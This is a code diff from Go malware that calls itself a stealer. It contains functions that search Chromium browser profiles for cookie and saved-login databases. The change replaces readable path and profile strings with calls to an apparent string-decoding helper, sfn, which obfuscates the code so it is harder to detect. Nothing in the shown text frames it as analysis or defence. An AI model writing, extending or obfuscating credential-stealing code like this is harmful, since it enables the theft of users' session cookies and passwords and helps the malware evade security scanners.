@@ -108,14 +108,14 @@ func runStealer() string {
 
 
 func stealChromiumCookies(userDataPath string, browserName string, browserExe string) (string, []string) {
-	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
+	profiles := []string{sfn(7), sfn(8), sfn(9), sfn(10), sfn(11), sfn(12)}
 	var allCookies strings.Builder
 	var errs []string
 
 	for _, profile := range profiles {
-		cookiePath := filepath.Join(userDataPath, profile, "Network", "Cookies")
+		cookiePath := filepath.Join(userDataPath, profile, sfn(0), sfn(1))
 		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
-			cookiePath = filepath.Join(userDataPath, profile, "Cookies")
+			cookiePath = filepath.Join(userDataPath, profile, sfn(1))
 			if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
 				continue
 			}
@@ -218,11 +218,11 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 }
 
 func stealChromiumLogins(userDataPath string, browserName string, browserExe string) string {
-	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
+	profiles := []string{sfn(7), sfn(8), sfn(9), sfn(10), sfn(11), sfn(12)}
 	var sb strings.Builder
 
 	for _, profile := range profiles {
-		loginPath := filepath.Join(userDataPath, profile, "Login Data")
+		loginPath := filepath.Join(userDataPath, profile, sfn(2))
 		if _, err := os.Stat(loginPath); os.IsNotExist(err) {
 			continue
 		}
